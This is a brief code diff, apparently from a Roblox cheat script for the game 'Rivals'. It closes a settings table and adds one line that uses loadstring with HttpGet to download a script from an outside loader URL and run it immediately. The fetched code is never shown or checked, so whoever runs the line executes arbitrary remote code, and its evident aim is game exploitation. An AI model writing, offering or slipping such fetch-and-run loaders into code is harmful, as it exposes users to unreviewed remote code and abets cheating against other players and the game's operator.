@@ -93,3 +93,5 @@ getgenv().Rivals = {
         }
     }
 }
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/d5e225e1e0ef3322b89ec131eff6ffe5.lua"))()
